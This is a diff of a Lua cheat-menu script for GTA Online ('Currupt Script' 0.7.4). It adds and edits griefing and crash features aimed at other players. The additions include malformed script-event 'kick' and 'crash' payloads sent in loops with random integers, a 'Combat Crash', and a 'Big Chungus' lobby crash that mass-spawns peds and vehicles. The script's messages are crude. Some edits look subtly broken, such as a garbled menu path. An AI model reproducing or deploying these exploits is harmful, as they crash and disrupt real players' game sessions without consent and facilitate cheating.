@@ -1,6 +1,6 @@
 --[[
 Huge Credits to all the people that provided us with public code <3
-I would of coded anything if it wasn't for these people.
+I wouldn't of coded anything if it wasn't for these people.
 
 ICYPhoenix
 Lance
@@ -31,12 +31,8 @@ util.require_natives("natives-1651208000")
 util.require_natives("natives-1627063482")
 util.require_natives("natives-1640181023")
 
-util.toast("Welcome To Currupt Script 0.6.9\n" .. "\n" .. "Official Discord: https://discord.gg/CMBYPZr2Rc\n" .. "\n" .. "WARNING! Notifications aren't always accurate")
-
-
---------------------------------------------------------------------------------------
-
-
+util.toast("Welcome To Currupt Script 0.7.4\n" .. "\n" .. "Official Discord: https://discord.gg/CMBYPZr2Rc\n" .. "\n" .. "WARNING! Notifications aren't always accurate")
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 	splashes = menu.list(menu.my_root(), "Join Discord", {}, "", function(); end)
 
@@ -391,15 +387,12 @@ local fake_pickup_types <const> = {
 
 local local_lists <const> = {
     ["Self"] = menu.list(funfun, "Self"),
-    ["World"] = menu.list(funfun, "World")
 }
 
 menu.divider(local_lists["Self"], "Self")
-menu.divider(local_lists["World"], "World")
 
 local local_sub_lists <const> = {
     ["Weapons"] = menu.list(local_lists["Self"], "Weapons"),
-    ["Clean Area"] = menu.list(local_lists["World"], "Clean Area")
 }
 
 
@@ -3169,7 +3162,7 @@ end)
 
 	menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
 		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
-		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
+		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>SyPanicncs>Incoming>Any Incoming Sync>Block>Disabled")
 		if on_toggle then
 			menu.trigger_command(BlockIncSyncs)
 			notification("Toggling block all incoming syncs on... Get those cunts!", colors.red)
@@ -3201,7 +3194,7 @@ end)
 		end
 	end)
 
-	menu.toggle(protex, "Toggle Panic Mode", {"panic"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
+	menu.toggle(protex, "Toggle Panic Mode", {"panic"}, "Uses all of the above. This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
 		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
 		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
 		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
@@ -3232,7 +3225,7 @@ end)
 
 menu.action(helpcommands, "Help Commands", {"helpcommands"}, "", function()
     chat.send_message(
-        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /casinohel1 /casinohelp2 /whatmenu /khos",
+        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu /khos",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3242,7 +3235,7 @@ end, nil, nil, COMMANDPERM_FRIENDLY)
 
 menu.toggle_loop(helpcommands, "Help Commands", {"helpcommand"}, "", function(on_toggle)
     chat.send_message(
-        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /casinohel1 /casinohelp2 /whatmenu /khos",
+        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /whatmenu /khos",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3418,7 +3411,7 @@ end)
 
 menu.action(help1, "Commands A", {"help1"}, "", function()
     chat.send_message(
-        "/rankplayer NAME /crazydrop NAME /cashon NAME /cashoff NAME /killgod NAME /killgodv2 NAME /monkeytroll NAME",
+        "/rankplayer NAME /crazydrop NAME /cashon NAME /cashoff NAME /killgod NAME /killgodv2 NAME",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3428,7 +3421,7 @@ end, nil, nil, COMMANDPERM_FRIENDLY)
 
 menu.toggle_loop(help1, "Commands A", {"help1"}, "", function(on_toggle)
     chat.send_message(
-        "/rankplayer NAME /crazydrop NAME /cashon NAME /cashoff NAME /killgod NAME /killgodv2 NAME /monkeytroll NAME",
+        "/rankplayer NAME /crazydrop NAME /cashon NAME /cashoff NAME /killgod NAME /killgodv2 NAME",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3594,7 +3587,7 @@ end)
 
 menu.action(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function()
     chat.send_message(
-        "I use Stand Ultimate, 2take1 VIP, Midnight, Nightfall, Cherax all co loaded and I'm waiting for North update... :) ",
+        "I use Stand Ultimate, 2take1 VIP, Cherax VIP, X-Force, Midnight, Nightfall all co loaded and I'm waiting for North update... :) ",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -3604,7 +3597,7 @@ end, nil, nil, COMMANDPERM_FRIENDLY)
 
 menu.toggle_loop(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function(on_toggle)
     chat.send_message(
-        "I use Stand Ultimate, 2take1 VIP, Midnight, Nightfall, Cherax all co loaded and I'm waiting for North update... :) ",
+        "I use Stand Ultimate, 2take1 VIP, Cherax VIP, X-Force, Midnight, Nightfall all co loaded and I'm waiting for North update... :) ",
         false, -- in team chat
         true, -- add to local history
         true  -- networked
@@ -4225,6 +4218,7 @@ GenerateFeatures = function(pid)
 			while true do end
 		end
 	end
+    
 
 	local dont_stop = false
 	menu.toggle_loop(troll_sub_vehicle_tab,"Vehicle Blackhole", {"blackhole"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
@@ -4701,6 +4695,7 @@ GenerateFeatures = function(pid)
     local pteleportEntities = menu.list(griefing, "Teleport Entities to Player", {}, "")
 
     menu.toggle_loop(pteleportEntities, "Teleport ALL Entities to Player", {"tpallentities"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
+        notification("Tp All Entities Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
         if on_toggle then
             menu.trigger_commands("tppeds" .. players.get_name(pid))
             util.yield(100)
@@ -4801,6 +4796,7 @@ end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
 
 menu.toggle_loop(griefing, "Rain Peds on Player", {"rainpeds"}, "", function(on_toggle)
+    notification("Rain Peds sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
     local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
         all_peds = entities.get_all_peds_as_handles()
@@ -4823,6 +4819,7 @@ end)
 
 
 menu.toggle_loop(griefing, "Rain Vehicles on Player", {"rainveh"}, "", function(on_toggle)
+    notification("Rain Vehicles sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
     local ped_c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
         all_peds = entities.get_all_vehicles_as_handles()
@@ -4880,102 +4877,6 @@ menu.toggle_loop(griefing, "Tp Spread Your Shit", {"tpspread"}, "Note: Great for
     for i=1,4  do
         ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -8000.0, 15999.0, 1337.0)
         util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 8000.0, 15999.0, 228.0)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -15999, 8000.0, 1488.0)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 15980, 8000.0, 2511.0)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 0.0, 0.0, 3333.0)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 228.0, 1337.0, 300.0)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1488.0, 2511.0, 500.0)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1488, 228.0, 100.0)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 236.49693, -3287.1396, 218.94739)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -302.23087, -2746.616, 218.8274)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1080.0892, -3216.1692, 218.92738)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1426.7888, -1947.4331, 219.22739)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 31.003777, -1712.2998, 218.85739)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1088.2968, -1741.2317, 218.80739)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 38.926704, -1179.2107, 218.72739)
-        util.yield(1000)
-        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -598185919)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1176.0138, -1155.3312, 218.7024)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2023.5466, -1586.9934, 254.41751)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1574.8975, -219.79503, 248.27252)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 282.33118, -918.1664, 248.51253)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1311.2397, -1089.2617, 113.432526)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -480.3737, -512.02185, 112.97753)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 194.14796, -237.3122, 113.07253)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -941.7805, -559.6383, 278.2239)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1778.0647, -135.50127, 77.71641)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -345.4514, 68.930046, 64.106674)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 626.34033, 675.4374, 297.40192)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -598.3136, 921.597, 480.12753)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1225.7482, 1030.5653, 398.89493)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2550.7805, 1474.307, 257.3236)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1031.0272, 2336.2424, 299.46002)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -2685.176, 1309.161, 358.17316)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -2234.161, 3063.7195, 237.47542)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -125.09618, 2889.9546, 47.616943)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 3048.5022, 2890.6616, 337.49854)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1612.4764, 3361.4456, 255.20859)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 94.61467, 3411.8962, 274.70602)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -958.8649, 3844.8564, 562.46686)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 457.30515, 5584.596, 820.92474)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1859.5883, 3834.0137, 241.04352)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 3164.7686, 4709.6646, 189.8146)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1749.2878, 5132.794, 334.62112)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -149.20198, 6372.635, 129.9393)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1101.6176, 4935.697, 375.57968)
-        util.yield(1000)
-        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), -598185919)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1419.6901, 6478.1836, 341.80444)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 463.5963, 5572.5386, 999.6124)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 70.43196, 6630.405, 166.17345)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 2549.6033, 6189.2363, 165.15588)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1336.5128, -3044.2126, 85.78445)
-        util.yield(1000)
     end
     ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
 end)
@@ -5002,6 +4903,7 @@ menu.toggle_loop(griefing, "Give Wanted", {"givewanted"}, "", function(on_toggle
 --Ptfx
 
 menu.toggle_loop(ptfxloop, "Electric", {"ptfxelectric"}, "", function(on_toggle)
+    notification("Electric sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             request_ptfx_asset("core")
             GRAPHICS.USE_PARTICLE_FX_ASSET("core")
             GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
@@ -5013,6 +4915,7 @@ menu.toggle_loop(ptfxloop, "Electric", {"ptfxelectric"}, "", function(on_toggle)
 	end)
 
 menu.toggle_loop(ptfxloop, "Smoke", {"ptfxsmoke"}, "", function(on_toggle)
+    notification("Smoke sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             request_ptfx_asset("core")
             GRAPHICS.USE_PARTICLE_FX_ASSET("core")
             GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
@@ -5024,6 +4927,7 @@ menu.toggle_loop(ptfxloop, "Smoke", {"ptfxsmoke"}, "", function(on_toggle)
 	end)
 
 menu.toggle_loop(ptfxloop, "Clown Explosions", {"ptfxclown"}, "", function(on_toggle)
+    notification("Clown Explosions sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
 		request_ptfx_asset("scr_rcbarry2")
 		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
 		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
@@ -5035,6 +4939,7 @@ menu.toggle_loop(ptfxloop, "Clown Explosions", {"ptfxclown"}, "", function(on_to
 	end)
 
 menu.toggle_loop(ptfxloop, "Extinguisher", {"ptfxextinguisher"}, "", function(on_toggle)
+    notification("Extinguisher sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             request_ptfx_asset("core")
             GRAPHICS.USE_PARTICLE_FX_ASSET("core")
             GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
@@ -5046,6 +4951,7 @@ menu.toggle_loop(ptfxloop, "Extinguisher", {"ptfxextinguisher"}, "", function(on
 	end)
 
 menu.toggle_loop(ptfxloop, "Water Mist", {"ptfxwatermist"}, "", function(on_toggle)
+    notification("Water Mist sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             GRAPHICS.USE_PARTICLE_FX_ASSET("core")
             GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                 "ent_anim_bm_water_mist", pos.x, pos.y, pos.z, 0, 0, 0, 2.5, false, false, false)
@@ -5720,6 +5626,7 @@ end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
 
 	menu.toggle(seizures, "Seizure V3", {"seizurev3"}, "", function(on_toggle)
+        notification("Seizure V3 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
 	if on_toggle then
 			menu.trigger_commands("seizurev1" .. players.get_name(pid))
 			menu.trigger_commands("seizurev2" .. players.get_name(pid))
@@ -5731,7 +5638,11 @@ end, nil, nil, COMMANDPERM_AGGRESSIVE)
 	end)
 
     menu.toggle_loop(griefing, "TP On Ped Loop", {"tploopon"}, "", function(on_toggle)
+    if on_toggle then
     menu.trigger_commands("tp" .. players.get_name(pid))
+    else
+    menu.trigger_commands("tp" .. players.get_name(pid))
+    end
     end)
 
     menu.toggle_loop(griefing, "Asteroid Smash", {"asteroidon"}, "Crush the player with an asteroid", function() 
@@ -7194,31 +7105,32 @@ function spawn_buzzard(pid, gunner_weapon, collision)
     menu.toggle_loop(kick, "Invalid Figure Kick", {"figurekick"}, "Drops invalid figures on player causing them to be kicked, also gives them rp and a lot of notifications with errors.", function(on_toggle)
         util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
     end)
-
+        
     menu.action(kick, "SE kick v1", {"kickv1"}, "", function()
-    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        util.trigger_script_event(1 << pid, {111242367, pid, -210634234})
-    	end, nil, nil, COMMANDPERM_AGGRESSIVE)
+    notification("Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+            local int_min = -2147483647
+            local int_max = 2147483647
+                for i = 1, 15 do
+                    util.trigger_script_event(1 << pid, {931221602, 24, 5, 1136816377, -1030212813, 1116101738, 1136772026, -1030205106, 1116101738, 1136852936, -1030108099, 1116101738, 1136724220, -1030340490, 1116101738, 1136907662, -1030087652, 1116101738, 5, 1126325289, 1126325289, 1126325289, 1126325289, 1126325289, 5, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 471761608, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max), 
+                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                    util.trigger_script_event(1 << pid, {931221602, 24, 5, 1136816377, -1030212813, 1116101738, 1136772026, -1030205106, 1116101738, 1136852936, -1030108099, 1116101738, 1136724220, -1030340490, 1116101738, 1136907662, -1030087652, 1116101738, 5, 1126325289, 1126325289, 1126325289, 1126325289, 1126325289, 5, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 471761608, 0, 0, 0})
+                end
+                util.yield()
+                for i = 1, 15 do
+                    util.trigger_script_event(1 << pid, {931221602, 24, 5, 1136816377, -1030212813, 1116101738, 1136772026, -1030205106, 1116101738, 1136852936, -1030108099, 1116101738, 1136724220, -1030340490, 1116101738, 1136907662, -1030087652, 1116101738, 5, 1126325289, 1126325289, 1126325289, 1126325289, 1126325289, 5, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 471761608, 0, 0, 0, pid, math.random(int_min, int_max)})
+                    util.trigger_script_event(1 << pid, {931221602, 24, 5, 1136816377, -1030212813, 1116101738, 1136772026, -1030205106, 1116101738, 1136852936, -1030108099, 1116101738, 1136724220, -1030340490, 1116101738, 1136907662, -1030087652, 1116101738, 5, 1126325289, 1126325289, 1126325289, 1126325289, 1126325289, 5, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 471761608, 0, 0, 0})
+                end
+        menu.trigger_commands("givesh" .. players.get_name(pid))
+        util.trigger_script_event(1 << pid, {931221602, 24, 5, 1136816377, -1030212813, 1116101738, 1136772026, -1030205106, 1116101738, 1136852936, -1030108099, 1116101738, 1136724220, -1030340490, 1116101738, 1136907662, -1030087652, 1116101738, 5, 1126325289, 1126325289, 1126325289, 1126325289, 1126325289, 5, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 471761608, 0, 0, 0})
+        end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
     menu.action(kick, "SE kick v2", {"kickv2"}, "", function()
-    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        util.trigger_script_event(1 << pid, {421832664, pid, 0, 1951261, 829})
-    	end, nil, nil, COMMANDPERM_AGGRESSIVE)
-
-    menu.action(kick, "SE kick v3", {"kickv3"}, "", function()
     notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
         util.trigger_script_event(1 << pid, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
     	end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
-    menu.action(kick, "SE kick v4", {"kickv4"}, "", function()
-    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        util.trigger_script_event(1 << pid, {603406648, 0, 380565701, -1443464333, 1, 115, 954851592, -768074745, 1278027916})
-    	end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
-    menu.action(kick, "SE kick v5", {"kickv5"}, "", function()
-    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        util.trigger_script_event(1 << pid, {603406648, 0, 1279476345, 655005918, 1, 115, 1997628673, 6299376, -302416007})
-    	end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
 	menu.divider(kick, "Stand Kicks")
 
@@ -7386,6 +7298,14 @@ function spawn_buzzard(pid, gunner_weapon, collision)
 			VEHICLE.SET_VEHICLE_FIXED(vehicle)
 		end
 	end, nil, nil, COMMANDPERM_FRIENDLY)
+
+    menu.toggle_loop(frienm,"Repair 5 min Loop", {"5minrepair"}, "Repairs player's vehicle every 5 minutes. Note: It will lag them a bit if you hold the toggle on", function(on_toggle)
+		local vehicle = get_player_veh(pid,true)
+		if vehicle then
+			VEHICLE.SET_VEHICLE_FIXED(vehicle)
+            util.yield(300000)
+		end
+	end)
 
 	menu.action(frienm,"GodVeh On", {"invon"}, "Gives invincibility to player's vehicle",function()
 		local vehicle = get_player_veh(pid,true)
@@ -7611,9 +7531,36 @@ local function BlockSyncs(pid, callback)
         end
     end
 end
-
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-    	local newcrash = menu.list(crash, "Annoy Modders", {}, "")
+
+menu.toggle_loop(crash, "Combat Crash", {"togglecombat"}, "", function(on_toggle)
+    local mdl = util.joaat('A_F_M_ProlHost_01')
+        BlockSyncs(pid, function()
+        if request_model(mdl, 2) then
+            local pos = players.get_position(pid)
+            util.yield(100)
+            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
+            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
+            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_COMBATMG'), 9999, true, true)
+            local obj
+            repeat
+                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
+            until obj ~= 0 or util.yield()
+            ENTITY.DETACH_ENTITY(obj, true, true) 
+            util.yield(1000)
+            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
+            entities.delete_by_handle(ped1)
+            util.yield(1500)
+    else
+            util.toast("Failed to load model. :/")
+notification("Worth it HAHA!!!", colors.red)
+    end
+end)
+end)
+
+        local newcrash = menu.list(crash, "Annoy Modders", {}, "")
+
 
         menu.toggle(newcrash, "Fatal Error", {"fatal"}, "WARNING: DO NOT SPECTATE!.", function(on)
 	if on then
@@ -7769,12 +7716,363 @@ else
 	        end
     end)
 
+
+local lobbycrash = menu.list(crash, "Lobby Crashes", {}, "")
+
+menu.action(lobbycrash, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
+        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
+        local mdl = util.joaat("A_C_Cat_01")
+        local mdl2 = util.joaat("U_M_Y_Zombie_01")
+        local mdl3 = util.joaat("A_F_M_ProlHost_01")
+        local mdl4 = util.joaat("A_M_M_SouCent_01")
+        local veh_mdl = util.joaat("insurgent2")
+        local veh_mdl2 = util.joaat("brawler")
+        util.request_model(veh_mdl)
+        util.request_model(veh_mdl2)
+        util.request_model(mdl)
+        util.request_model(mdl2)
+        util.request_model(mdl3)
+        util.request_model(mdl4)
+        for i = 1, 250 do
+            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
+            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
+            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
+            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
+            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
+            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
+            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
+    
+            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
+    
+            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
+    
+            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
+    
+            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
+    
+            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
+    
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
+    
+            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
+    
+            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
+    
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
+            util.yield(100)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
+    
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
+    
+            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
+            
+            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
+    
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
